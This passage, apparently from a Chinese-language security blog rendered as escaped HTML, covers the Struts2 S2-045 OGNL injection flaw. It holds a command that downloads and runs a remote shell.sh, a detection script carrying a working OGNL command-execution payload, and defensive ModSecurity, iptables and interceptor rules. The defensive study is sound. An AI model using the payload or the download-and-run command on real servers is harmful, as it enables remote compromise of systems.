class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;wget http:&lt;span class=&#34;hljs-comment&#34;&gt;//192.168.56.1:8000/shell.sh -O /tmp/shell.sh &amp;amp;&amp;amp; chmod +x /tmp/shell.sh &amp;amp;&amp;amp; /tmp/shell.sh&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;æ£€æµ‹ä¸é˜²æŠ¤&#34;&gt;&lt;a href=&#34;#æ£€æµ‹ä¸é˜²æŠ¤&#34; class=&#34;headerlink&#34; title=&#34;æ£€æµ‹ä¸é˜²æŠ¤&#34;&gt;&lt;/a&gt;æ£€æµ‹ä¸é˜²æŠ¤&lt;/h2&gt;&lt;h3 id=&#34;æ¼æ´æ£€æµ‹è„šæœ¬&#34;&gt;&lt;a href=&#34;#æ¼æ´æ£€æµ‹è„šæœ¬&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´æ£€æµ‹è„šæœ¬&#34;&gt;&lt;/a&gt;æ¼æ´æ£€æµ‹è„šæœ¬&lt;/h3&gt;&lt;figure class=&#34;highlight livescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs livescript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; sys&lt;br&gt;&lt;br&gt;def check_s2_045(url):&lt;br&gt;    payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;%&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#nike&lt;/span&gt;=&amp;#x27;multipart/form-data&amp;#x27;).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#_memberAccess&lt;/span&gt;?(&lt;span class=&#34;hljs-subst&#34;&gt;#_memberAccess&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;):(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#container&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#context&lt;/span&gt;[&amp;#x27;com.opensymphony.xwork2.ActionContext.container&amp;#x27;]).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#container&lt;/span&gt;.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedPackageNames().clear()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedClasses().clear()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#context&lt;/span&gt;.setMemberAccess(&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        )).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;=&amp;#x27;echo &amp;quot;S2045_VULN_TEST&amp;quot;&amp;#x27;).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#iswin&lt;/span&gt;=(@java.lang.System@getProperty(&amp;#x27;os.name&amp;#x27;).toLowerCase().contains(&amp;#x27;win&amp;#x27;))).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#cmds&lt;/span&gt;=(&lt;span class=&#34;hljs-subst&#34;&gt;#iswin&lt;/span&gt;?&amp;#123;&amp;#x27;cmd.exe&amp;#x27;,&amp;#x27;/c&amp;#x27;,&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;&amp;#125;:&amp;#123;&amp;#x27;/bin/bash&amp;#x27;,&amp;#x27;-c&amp;#x27;,&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;&amp;#125;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;=new java.lang.ProcessBuilder(&lt;span class=&#34;hljs-subst&#34;&gt;#cmds&lt;/span&gt;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;.redirectErrorStream(true)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#process&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;.start()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (@org.apache.commons.io.IOUtils@copy(&lt;span class=&#34;hljs-subst&#34;&gt;#process&lt;/span&gt;.getInputStream(),&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;.flush())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;    &amp;#125;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;br&gt;    headers = &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Content-Type&amp;#x27;&lt;/span&gt;: payload,&lt;br&gt;        &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;User-Agent&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Mozilla/5.0 (compatible; S2-045-Scanner)&amp;#x27;&lt;/span&gt;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;br&gt;    try:&lt;br&gt;        response = requests.get(url, headers=headers, timeout=&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;S2045_VULN_TEST&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; response.text:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] &amp;#123;url&amp;#125; is vulnerable to S2-045!&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; True&lt;br&gt;        else:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[-] &amp;#123;url&amp;#125; is not vulnerable to S2-045&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; False&lt;br&gt;    except Exception &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; e:&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] Error testing &amp;#123;url&amp;#125;: &amp;#123;str(e)&amp;#125;&amp;quot;&lt;/span&gt;)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; False&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; len(sys.argv) != &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Usage: python3 s2-045-check.py &amp;lt;URL&amp;gt;&amp;quot;&lt;/span&gt;)&lt;br&gt;        sys.exit(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;br&gt;    &lt;br&gt;    target_url = sys.argv[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]&lt;br&gt;    check_s2_045(target_url)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;å®‰å…¨é˜²æŠ¤æªæ–½&#34;&gt;&lt;a href=&#34;#å®‰å…¨é˜²æŠ¤æªæ–½&#34; class=&#34;headerlink&#34; title=&#34;å®‰å…¨é˜²æŠ¤æªæ–½&#34;&gt;&lt;/a&gt;å®‰å…¨é˜²æŠ¤æªæ–½&lt;/h3&gt;&lt;h4 id=&#34;1-ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰&#34;&gt;&lt;a href=&#34;#1-ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰&#34; class=&#34;headerlink&#34; title=&#34;1. ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰&#34;&gt;&lt;/a&gt;1. ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰&lt;/h4&gt;&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# å‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Apache&lt;/span&gt; Struts &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;+ æˆ– &lt;span class=&#34;hljs-number&#34;&gt;2.5.10.1&lt;/span&gt;+&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;2-WAFè§„åˆ™é…ç½®&#34;&gt;&lt;a href=&#34;#2-WAFè§„åˆ™é…ç½®&#34; class=&#34;headerlink&#34; title=&#34;2. WAFè§„åˆ™é…ç½®&#34;&gt;&lt;/a&gt;2. WAFè§„åˆ™é…ç½®&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;ModSecurityè§„åˆ™&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight 1c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs 1c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# æ£€æµ‹S2-045æ”»å‡»ç‰¹å¾&lt;/span&gt;&lt;br&gt;SecRule REQUEST_HEADERS&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;Content&lt;span class=&#34;hljs-punctuation&#34;&gt;-&lt;/span&gt;Type &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;@detectSQLi&amp;quot;&lt;/span&gt; \&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;id:1001,\&lt;/span&gt;&lt;br&gt;    phase&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    block&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    msg&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Struts2 S2-045 Attack Detected&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    logdata&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Content-Type: %&amp;#123;MATCHED_VAR&amp;#125;&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    tag&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;attack-sqli&amp;#x27;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    tag&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&amp;#x27;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# æ£€æµ‹OGNLè¡¨è¾¾å¼&lt;/span&gt;&lt;br&gt;SecRule REQUEST_HEADERS&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;Content&lt;span class=&#34;hljs-punctuation&#34;&gt;-&lt;/span&gt;Type &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;@contains %&amp;#123;&amp;quot;&lt;/span&gt; \&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;id:1002,\&lt;/span&gt;&lt;br&gt;    phase&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    block&lt;span class=&#34;hljs-punctuation&#34;&gt;,&lt;/span&gt;\&lt;br&gt;    msg&lt;span class=&#34;hljs-punctuation&#34;&gt;:&lt;/span&gt;&amp;#x27;Potential OGNL Injection in Content-Type&amp;#x27;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;3-ç½‘ç»œå±‚é˜²æŠ¤&#34;&gt;&lt;a href=&#34;#3-ç½‘ç»œå±‚é˜²æŠ¤&#34; class=&#34;headerlink&#34; title=&#34;3. ç½‘ç»œå±‚é˜²æŠ¤&#34;&gt;&lt;/a&gt;3. ç½‘ç»œå±‚é˜²æŠ¤&lt;/h4&gt;&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;# iptablesè§„åˆ™ç¤ºä¾‹&lt;br&gt;iptables -&lt;span class=&#34;hljs-selector-tag&#34;&gt;A&lt;/span&gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;INPUT&lt;/span&gt; -&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt; tcp &lt;span class=&#34;hljs-attr&#34;&gt;--dport&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt; -m string &lt;span class=&#34;hljs-attr&#34;&gt;--string&lt;/span&gt; &amp;quot;%&amp;#123;&amp;quot; &lt;span class=&#34;hljs-attr&#34;&gt;--algo&lt;/span&gt; bm -j DROP&lt;br&gt;iptables -&lt;span class=&#34;hljs-selector-tag&#34;&gt;A&lt;/span&gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;INPUT&lt;/span&gt; -&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt; tcp &lt;span class=&#34;hljs-attr&#34;&gt;--dport&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt; -m string &lt;span class=&#34;hljs-attr&#34;&gt;--string&lt;/span&gt; &amp;quot;ognl&amp;quot; &lt;span class=&#34;hljs-attr&#34;&gt;--algo&lt;/span&gt; bm -j DROP&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;4-åº”ç”¨å±‚åŠ å›º&#34;&gt;&lt;a href=&#34;#4-åº”ç”¨å±‚åŠ å›º&#34; class=&#34;headerlink&#34; title=&#34;4. åº”ç”¨å±‚åŠ å›º&#34;&gt;&lt;/a&gt;4. åº”ç”¨å±‚åŠ å›º&lt;/h4&gt;&lt;figure class=&#34;highlight scala&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs scala&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// è‡ªå®šä¹‰æ‹¦æˆªå™¨&lt;/span&gt;&lt;br&gt;public &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;SecurityInterceptor&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;AbstractInterceptor&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;&lt;br&gt;    public &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; intercept(&lt;span class=&#34;hljs-type&#34;&gt;ActionInvocation&lt;/span&gt; invocation) &lt;span class=&#34;hljs-keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;Exception&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;HttpServletRequest&lt;/span&gt; request = &lt;span class=&#34;hljs-type&#34;&gt;ServletActionContext&lt;/span&gt;.getRequest();&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; contentType = request.getContentType();&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (contentType != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; contentType.contains(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%&amp;#123;&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;SecurityException&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Malicious Content-Type detected&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; invocation.invoke();&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;å®æˆ˜æŠ€å·§ä¸å·¥å…·&#34;&gt;&lt;a href=&#34;#å®æˆ˜æŠ€å·§ä¸å·¥å…·&#34; class=&#34;headerlink&#34; title=&#34;å®æˆ˜æŠ€å·§ä¸å·¥å…·&#34;&gt;&lt;/a&gt;å®æˆ˜æŠ€å·§ä¸å·¥å…·&lt;/h2&gt;&lt;h3 id=&#34;BurpSuiteæ’ä»¶å¼€å‘&#34;&gt;&lt;a href=&#34;#BurpSuiteæ’ä»¶å¼€å‘&#34; class=&#34;headerlink&#34; title=&#34;BurpSuiteæ’ä»¶å¼€å‘&#34;&gt;&lt;/a&gt;BurpSuiteæ’ä»¶å¼€å‘&lt;/h3&gt;&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span 